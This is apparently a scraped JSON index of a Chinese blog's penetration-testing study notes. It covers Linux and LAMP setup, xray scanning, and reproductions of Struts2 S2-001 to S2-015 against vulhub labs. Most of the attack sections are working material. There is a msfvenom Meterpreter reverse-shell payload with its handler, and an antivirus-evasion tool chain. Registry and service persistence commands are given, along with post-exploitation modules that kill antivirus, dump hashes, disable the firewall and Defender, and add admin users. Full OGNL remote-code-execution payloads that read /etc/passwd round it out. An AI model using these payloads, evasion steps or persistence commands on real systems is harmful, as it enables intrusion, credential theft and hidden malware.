[用户] -r表示连用户宿主目录一并删除 etc/passwd：存放系统账号 linux查看管理员是看uid和pid号，0为管理员h. ps -aux：查看系统进程 top：动态查看进程 q退出 kill：杀死进程netstat -tnlp：查看本地开放端口信息netstat -an：查看与外部连接情况详细信息 1234LAMP平台：Linux+Apache+Mysql+PHPLNMP平台：Linux+Nginx+Mysql+PHPWAMP平台：Winodws+Apache+Mysql+PHPWNMP平台：Winodws+Nginx+Mysql+PHP 3.vi编辑器： 123456789101112语法：vi [-options] [+[n]] [file] -r用于恢复系统突然崩溃时正在编辑的文件，-R用于以只读方式打开文件 +n用来指明进入vi后直接位于文件的第n行，如果不指定n，则位于最后一行命令模式：进入即为命令模式，可输入命令操控 i. G：进入文本尾部 gg：返回文首 ii. ctrl+g：代表显示信息，行号 iii. dd：删除光标所在行 D：删除光标所在位置到行尾 6dd：删除6行 iv. yy：复制当前行 p：粘贴 dd完在p相当于剪切插入模式：按a，i，o任意一个键进入插入模式，当记事本用底行模式：esc到命令模式，按shift+： i. :wq：保存并退出 ii. :q！：退出不保存 5.LAMP****搭建配置 123456781. 配置好yum环境2. 挂载光驱 mount /dev/sr0 /media3. yum -y install httpd mysql mysql-server php php-mysql 安装这几个包4. service httpd startservice mysqld start5. mysqladmin -u root password 123123 为mysql设置账号密码6. 拖源码7. chown -R apache:apache /var/www/html 改权限 搭建旁站 1234Apache配置文件：vi /etc/httpd/conf/httpd.confListen 80：侦听的端口DocumentRoot：网站根目录DirectoryIndex：默认首页","categories":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"msf木马","slug":"木马制作","date":"2024-02-26T02:25:19.085Z","updated":"2022-05-12T12:11:37.110Z","comments":true,"path":"2024/02/26/木马制作/","permalink":"http://example.com/2024/02/26/%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C/","excerpt":"","text":"1234567root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.44.128 LPORT=4444 -f exe &gt; shell.exeuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.44.128set lport 4444exploit","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"msf","slug":"渗透测试/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/msf/"}],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"简单的免杀学习","slug":"免杀","date":"2024-02-26T02:25:19.084Z","updated":"2022-04-08T17:00:33.571Z","comments":true,"path":"2024/02/26/免杀/","permalink":"http://example.com/2024/02/26/%E5%85%8D%E6%9D%80/","excerpt":"","text":"windows下的免杀生成 如果需要捆绑正常软件运行使用shellter，如不能过免杀，再分步测试以下操作。cs文件编码混淆用AVIATOR生成。 1234567891.Lime-Crypter 注入线程2.DeepSeaOBFuscator 封装3.CryptoObfuscator 混淆4.https 证书修改5.base64prionx 混淆6.themida 加壳7.https 证书修改8.viper(在线msf处理平台可加特征和签名很方便)*通用免杀法（简单概括就是1.修改特征码2.花指令免杀3.加壳免杀。） 也可以通过把软件分块用杀软重复扫描找到特征码进行修改,当然也可以通过加载器的形式更加靠谱但是需要落地多个文件，c#文件自己封装推荐avator+掩盖日可以过火绒 Veil是一种免杀生成工具，用于生成绕过常见防病毒解决方案的metasploit有效负载。 ps：合理利用后渗透插件可以剩下很多时间，但是要注意痕迹清理。插件有谢公子和梼杌完整版比较常用, Cobaltstrike推荐插件：谢公子、梼杌、Z1-AggressorScripts、ladong添加开机自启 123reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\\Users\\KingXL\\1.exe&quot; /f reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;test&quot; /t REG_SZ /d &quot;C:\\Users\\KingXL\\1.exe&quot; /f sc create &quot;server power&quot; binpath= &quot;C:\\Windows\\System32\\config.exe&quot;//设置服务的描述字符串sc description &quot;server power&quot; &quot;description&quot; //设置这个服务为自动启动sc config &quot;server power&quot; start= auto net start &quot;server power&quot; 启动服务","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"免杀","slug":"渗透测试/免杀","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"漏洞复现学习笔记","slug":"漏洞复现","date":"2024-02-26T02:25:19.083Z","updated":"2022-04-08T17:01:40.461Z","comments":true,"path":"2024/02/26/漏洞复现/","permalink":"http://example.com/2024/02/26/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"漏洞复现学习笔记1.Struts21.1Struts2 S2-016 漏洞环境123451.拉取镜像到本地 docker pull medicean/vulapps:s_struts2_s2-0162.启动环境 docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-016 -p 80:8080 前面的 80 代表物理机的端口，可随意指定。 EXP1/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D 1.2Struts2 S2-008漏洞环境12345拉取镜像到本地$ docker pull medicean/vulapps:s_struts2_s2-008启动环境$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-008 12345678Struts &lt;= 2.2.3 ( ExceptionDelegator)中的远程命令执行当将参数值应用于属性时发生异常时，该值将被评估为 OGNL 表达式。例如，将字符串值设置为整数属性时会发生这种情况。由于未过滤这些值，攻击者可以滥用 OGNL 语言的功能来执行任意 Java 代码，从而导致远程命令执行。此问题已报告 ( https://issues.apache.org/jira/browse/WW-3668 ) 并已在 Struts 2.2.3.1 中修复。然而，执行任意 Java 代码的能力被忽略了。Struts &lt;= 2.3.1 中的远程命令执行( CookieInterceptor)参数名称的字符白名单不适用于CookieInterceptor. 当 Struts 被配置为处理 cookie 名称时，攻击者可以通过静态方法访问 Java 函数来执行任意系统命令。allowStaticMethodAccess因此，可以在请求中将该标志设置为 true。ParameterInterceptorStruts &lt;= 2.3.1 ( )中的任意文件覆盖虽然自 Struts 2.2.3.1 起禁止访问参数中的标志allowStaticMethodAccess，但攻击者仍然可以仅使用一个 String 类型的参数访问公共构造函数来创建新的 Java 对象并仅使用一个字符串类型的参数。这可以在示例中被滥用来创建和覆盖任意文件。要将禁用字符注入文件名，可以使用未初始化的字符串属性。Struts &lt;= 2.3.17 ( DebuggingInterceptor)中的远程命令执行虽然本身不​​是一个安全漏洞，但请注意，在开发人员模式下运行并使用 的应用程序DebuggingInterceptor也容易远程执行命令。虽然应用程序不应该在生产期间以开发人员模式运行，但开发人员应该意识到这样做不仅会产生性能问题（如文档所述），还会产生严重的安全影响。 exp1/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat /etc/passwd%27%29.getInputStream%28%29%29)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"struts2","slug":"漏洞复现/struts2","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/struts2/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"struts2","slug":"struts2","permalink":"http://example.com/tags/struts2/"}]},{"title":"后渗透模块学习","slug":"后渗透","date":"2024-02-26T02:25:19.081Z","updated":"2022-04-08T16:59:36.220Z","comments":true,"path":"2024/02/26/后渗透/","permalink":"http://example.com/2024/02/26/%E5%90%8E%E6%B8%97%E9%80%8F/","excerpt":"","text":"后渗透模块post后渗透模块 1234567891011121314151617181920run post/windows/manage/migrate #自动进程迁移run post/windows/gather/checkvm #查看目标主机是否运行在虚拟机上run post/windows/manage/killav #关闭杀毒软件run post/windows/manage/enable_rdp #开启远程桌面服务run post/windows/manage/autoroute #查看路由信息run post/windows/gather/enum_logged_on_users #列举当前登录的用户run post/windows/gather/enum_applications #列举应用程序run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码run post/windows/gather/smart_hashdump #dump出所有用户的hashrun getgui -u hack -p 123run post/windows/gather/enum_patches 补丁信息run post/multi/recon/local_exploit_suggester 查询可利用的漏洞有时候无法使用后渗透模块添加用户可以使用shell自主添加net user hack Zyx960706 /addnet localgroup administrator hack /addnetsh advfirewall set allprofiles state off #关闭防火墙net stop windefendrun post/windows/gather/enum_patches 补丁信息run post/multi/recon/local_exploit_suggester 查询可利用的漏洞 域内存活主机探测（系统、端口） 1234auxiliary/scanner/discovery/udp_sweep #基于udp协议发现内网存活主机auxiliary/scanner/discovery/udp_probe #基于udp协议发现内网存活主机auxiliary/scanner/netbios/nbname #基于netbios协议发现内网存活主机auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描(1-10000) 端口扫描 123auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描(1-10000)auxiliary/scanner/portscan/ack #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口端口扫描有时会使会话终端，所以可以上传nmap后在shell中使用nmap扫描。但是要记得清理 服务扫描 1234567891011121314auxiliary/scanner/ftp/ftp_version #发现内网ftp服务，基于默认21端口auxiliary/scanner/ssh/ssh_version #发现内网ssh服务，基于默认22端口auxiliary/scanner/telnet/telnet_version #发现内网telnet服务，基于默认23端口auxiliary/scanner/dns/dns_amp #发现dns服务，基于默认53端口auxiliary/scanner/http/http_version #发现内网http服务，基于默认80端口auxiliary/scanner/http/title #探测内网http服务的标题auxiliary/scanner/smb/smb_version #发现内网smb服务，基于默认的445端口 use auxiliary/scanner/mssql/mssql_schemadump #发现内网SQLServer服务,基于默认的1433端口use auxiliary/scanner/oracle/oracle_hashdump #发现内网oracle服务,基于默认的1521端口auxiliary/scanner/mysql/mysql_version #发现内网mysql服务，基于默认3306端口auxiliary/scanner/rdp/rdp_scanner #发现内网RDP服务，基于默认3389端口auxiliary/scanner/redis/redis_server #发现内网Redis服务，基于默认6379端口auxiliary/scanner/db2/db2_version #探测内网的db2服务，基于默认的50000端口auxiliary/scanner/netbios/nbname #探测内网主机的netbios名字","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"渗透测试/后渗透","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"msf","slug":"渗透测试/后渗透/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/"}],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"后渗透","permalink":"http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"}]},{"title":"xray学习","slug":"xray","date":"2024-02-26T02:25:19.078Z","updated":"2022-04-08T16:58:09.055Z","comments":true,"path":"2024/02/26/xray/","permalink":"http://example.com/2024/02/26/xray/","excerpt":"","text":"使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描 1xray webscan --basic-crawler http://example.com --html-output vuln.html 使用 HTTP 代理进行被动扫描 1xray webscan --listen 127.0.0.1:7777 --html-output proxy.html 设置浏览器 http 代理为 http://127.0.0.1:7777，就可以自动分析代理流量并扫描。 如需扫描 https 流量，请阅读下方文档 抓取 https 流量 部分 只扫描单个 url，不使用爬虫 1xray webscan --url http://example.com/?a=b --html-output single-url.html 手动指定本次运行的插件 默认情况下，将会启用所有内置插件，可以使用下列命令指定本次扫描启用的插件。 12xray webscan --plugins cmd-injection,sqldet --url http://example.comxray webscan --plugins cmd-injection,sqldet --listen 127.0.0.1:7777 指定插件输出 可以指定将本次扫描的漏洞信息输出到某个文件中: 12xray webscan --url http://example.com/?a=b \\--text-output result.txt --json-output result.json --html-output report.html","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"xray","slug":"渗透测试/xray","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xray/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"xray","slug":"xray","permalink":"http://example.com/tags/xray/"}]},{"title":"","slug":"Struts2漏洞S2-008复现","date":"2024-02-26T02:25:19.071Z","updated":"2022-04-08T17:19:40.979Z","comments":true,"path":"2024/02/26/Struts2漏洞S2-008复现/","permalink":"http://example.com/2024/02/26/Struts2%E6%BC%8F%E6%B4%9ES2-008%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"123456789title: 漏洞复现学习（s2-008）tags: - 渗透测试 - 漏洞复现 - struts2categories: - 渗透测试 - 漏洞复现 - struts2 Struts2漏洞S2-008复现123原理：S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。影响版本：Struts 2.1.0 – 2.3.1 漏洞搭建1https://github.com/vulhub/vulhub/tree/master/struts2/s2-008 poc构建例如?debug=command&amp;expression=&lt;OGNL EXP&gt;在devModemode中添加参数，OGNL表达式会直接执行，可以执行命令： 1devmode.action?debug=command&amp;expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=id","categories":[],"tags":[]},{"title":"","slug":"Struts2漏洞漏洞合集复现","date":"2024-02-26T02:25:19.071Z","updated":"2022-04-08T17:18:22.453Z","comments":true,"path":"2024/02/26/Struts2漏洞漏洞合集复现/","permalink":"http://example.com/2024/02/26/Struts2%E6%BC%8F%E6%B4%9E%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"123456789title: 漏洞复现学习（struts2）tags: - 渗透测试 - 漏洞复现 - struts2categories: - 渗透测试 - 漏洞复现 - struts2 Struts2 漏洞复现合集学习笔记S2-001复现原理：1该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%&#123;value&#125;进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%&#123;value&#125;对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。 漏洞环境搭建https://github.com/vulhub/vulhub/tree/master/struts2/s2-001 运行以下命令进行设置 12docker-compose builddocker-compose up -d 访问 http://127.0.0.1:8080/ 漏洞poc测试1.输入**%{‘123’}**，sumbit 2.返回123，参数值，证明漏洞存在 构造poc 获取tomcat路径：1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; 语句执行后，查看返回的语句信息： 获取网站真实路径：1%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125; 构造查看权限的poc：123456789101112131415161718192021%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 执行任意命令只需要将上面的poc中whoami替换：12345678910111213141516171819%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 执行命令（带参数的命令：new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;）：1%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 关闭docker环境1命令：docker-compose down -v S2-005复现1s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\\u0023)或8进制(\\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开 影响版本：Struts 2.0.0-2.1.8.1 漏洞搭建1https://github.com/vulhub/vulhub/tree/master/struts2/s2-005 运行以下命令启动环境 12docker-compose builddocker-compose up -d 搭建成功： 构建poc使用抓包工具burp suite，修改数据包插入poc 1(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 Poc2： 1?%27%2B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29%2B%27 查看数据连接状态命令： 1docker exec -it c25543ef6c4c /bin/bash ls &#x2F;tmp S2-008复现原理：1S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。 影响版本：Struts 2.1.0 – 2.3.1 漏洞搭建1https://github.com/vulhub/vulhub/tree/master/struts2/s2-008 poc构建例如?debug=command&amp;expression=&lt;OGNL EXP&gt;在devModemode中添加参数，OGNL表达式会直接执行，可以执行命令： 1devmode.action?debug=command&amp;expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=id S2-009复现原理：1OGNL提供了广泛的表达式评估功能等功能。该漏洞允许恶意用户绕过ParametersInterceptor内置的所有保护（正则表达式，拒绝方法调用），从而能够将任何暴露的字符串变量中的恶意表达式注入进行进一步评估。ParametersInterceptor中的正则表达式将top [&#x27;foo&#x27;]（0）作为有效的表达式匹配，OGNL将其作为（top [&#x27;foo&#x27;]）（0）处理，并将“foo”操作参数的值作为OGNL表达式求值。这使得恶意用户将任意的OGNL语句放入由操作公开的任何String变量中，并将其评估为OGNL表达式，并且由于OGNL语句在HTTP参数中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法，绕过ParametersInterceptor和OGNL库保护。 影响版本：Struts 2.1.0 - 2.3.1.1 环境搭建 poc构建burp，修改数据包 1/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)] S2-012复现原理：1如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 $&#123;param_name&#125; 作为重定向变量，UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 $&#123;name&#125; 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。 影响版本：Struts 2.1.0-2.3.13 1234567&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt; &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt; &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt; &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt; &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt; &lt;/action&gt;&lt;/package&gt; 漏洞搭建 poc构建1%25%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%22%2f%62%69%6e%2f%62%61%73%68%22%2c%22%2d%63%22%2c%20%22%6c%73%22%7d%29%29%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%66%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d Poc2： 原始poc： 1%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;, &quot;ls&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 注：利用此漏洞需要进行url编码 1%25%7B#a=(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22cat%22,%20%22/etc/passwd%22%7D)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new%20java.io.InputStreamReader(#b),#d=new%20java.io.BufferedReader(#c),#e=new%20char%5B50000%5D,#d.read(#e),#f=#context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22),#f.getWriter().println(new%20java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()%7D S2-013复现原理123456struts2的标签中 和 都有一个 includeParams 属性，可以设置成如下值none - URL中不包含任何参数（默认）get - 仅包含URL中的GET参数all - 在URL中包含GET和POST参数此时 或尝试去解析原始请求参数时，会导致OGNL表达式的执行 影响版本：Struts 2.0.0-2.3.14 漏洞搭建 Struts2 的标签&lt;s:a&gt;和&lt;s:url&gt;提供了一个 includeParams 属性。该属性的主要作用域是了解是否包含 http 请求参数。 includeParams 的允许值为： none - 在 URL 中不包含任何参数（默认） get - 在 URL 中仅包含 GET 参数 all - 在 URL 中包含 GET 和 POST 参数 当 时includeParams=all，这个请求的 GET 和 POST 参数放在 URL 的 GET 参数上。在此过程中，参数将被 OGNL 表达式解析。它导致命令执行。 poc构建1a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;id&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#x27;dbapp%3D&#x27;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D S2-015复现原理漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如： 12345&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt; &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt; &lt;result&gt;/&#123;1&#125;.jsp&lt;/result&gt; &lt;/action&gt;&lt;/package&gt; 上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 &#x2F; “ \\ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。 在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[&#39;allowStaticMethodAccess&#39;]=true 来修改其值达到重获静态方法调用的能力。 这里为了到达执行命令的目的可以用 调用动态方法 (new java.lang.ProcessBuilder(‘calc’)).start() 来解决 